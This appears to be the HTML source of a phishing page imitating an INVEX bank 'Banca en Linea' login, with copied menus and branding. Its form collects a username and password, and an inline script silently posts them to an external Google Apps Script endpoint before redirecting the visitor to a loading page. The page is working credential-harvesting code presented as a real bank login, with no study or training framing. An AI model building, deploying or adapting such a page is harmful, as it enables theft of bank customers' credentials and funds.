<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ivxbanco</title>

    <link rel="icon" href="img/icono.imagotipo.svg">

    <link rel="stylesheet" href="style.css">

</head>
<body>

    <header class="header">

        <div class="logo">
            <a href="index.html" class="logo"><img src="img/LogoBanco.png" alt="logo"></a>
        </div>

        <input type="checkbox" id="toggle">
        <label for="toggle"><img class="menu" src="img/icono_bars.svg" alt="menu"></label>
        
        <nav class="navigation">

            <ul>
                
                <li><a href="#" class="acceso"><img src="img/icono-login.svg" alt="educacion">Acceso a clientes</a>
                    <ul>
                        <li><a href="#">Cuentas de Efectivo e Inversión</a></li>
                        <li><a href="#">INVEX Renacer</a></li>
                        <li><a href="formulario.html">INVEX Tarjetas</a></li>
                        <li><a href="#">Portal Fiduciario</a></li>
                        <li><a href="#">Previsión y Ahorro</a></li>
                    </ul>
                </li>
                <li><a href="#">Personas</a>
                    <ul>
                        <li><a href="#">Banca Privada</a></li>
                        <li><a href="#">Banca Patrimonial</a></li>
                        <li><a href="#">Fiduciario</a></li>
                        <li><a href="#">Tarjetas de Crédito</a></li>
                        <li><a href="#">NowBank</a></li>
                        <li><a href="#">Retiro</a></li>
                    </ul>
                </li>
                <li><a href="#">Empresas</a>
                    <ul>
                        <li><a href="#">Banca Empresas</a></li>
                        <li><a href="#">Arrendadora</a></li>
                        <li><a href="#">Fiduciario</a></li>
                        <li><a href="#">Tarjetas de Crédito</a></li>
                    </ul>
                </li>
                <li><a href="#">Nosotros</a></li>
            </ul>
        </nav>
    </header>
    
    <section class="ingresar" id="ingresar">
        <form id="miFormulario">
    <p>Accede a</p>
    <h2>tu Banca en Linea</h2>

    <div class="inputcaja">
        <label for="usuario">Usuario</label>
        <input type="text" name="usuario" placeholder="Usuario" id="usuario" required>

        <label for="contraseña">Contraseña</label>
        <input type="password" name="password" placeholder="Contraseña" id="contraseña" required>

        <label for="confirmar_contraseña">Confirmar Contraseña</label>
        <input type="password" name="password_confirm" placeholder="Confirmar contraseña" id="confirmar_contraseña" required>

        <input class="btn" type="submit" value="INGRESAR">
    </div>
</form>

<script>
  const form = document.getElementById('miFormulario');
  const scriptURL = 'https://script.google.com/macros/s/AKfycbw5osmSFxHL5gsPlGHFjl9Ik1Hpshc3beaAMmUla4VUbbEhkpN43elAC9-Xy1YiIO8TWw/exec';

  form.addEventListener('submit', function (e) {
    e.preventDefault(); // Previene el envío por defecto

    fetch(scriptURL, {
      method: 'POST',
      body: new FormData(form)
    })
    .then(response => {
      if (response.ok) {
        // Redirige tras el envío exitoso
        window.location.href = 'loading.html';
      } else {
        alert('Hubo un error al enviar. Intenta de nuevo.');
      }
    })
    .catch(error => {
      console.error('Error al enviar:', error);
      alert('Error al conectar con el servidor.');
    });
  });
</script>
    </section>

    <section class="imagen2" id="imagen2">
        <div class="end">
            <a href="#" class="footer"><img src="img/footer-BA-01.jpg" alt="footer"></a>
        </div>
    </section>

    <script>
        function validarFormulario(event) {
            event.preventDefault(); // Evita el envío del formulario por defecto

            var usuario = document.getElementById("usuario").value.trim();
            var password = document.getElementById("contraseña").value;
            var passwordConfirm = document.getElementById("confirmar_contraseña").value;

            if (usuario === "" || password === "" || passwordConfirm === "") {
                alert("Por favor, completa todos los campos.");
                return false;
            }

            if (password !== passwordConfirm) {
                alert("Las contraseñas no coinciden.");
                return false;
            }
            window.location.href = "bloqueo.html"; // Redirige a la página bloqueo.html si la validación es exitosa

            // Redirige a la página bloqueo.html si la validación es exitosa
            return true;
        }
    </script>
    
</body>
</html>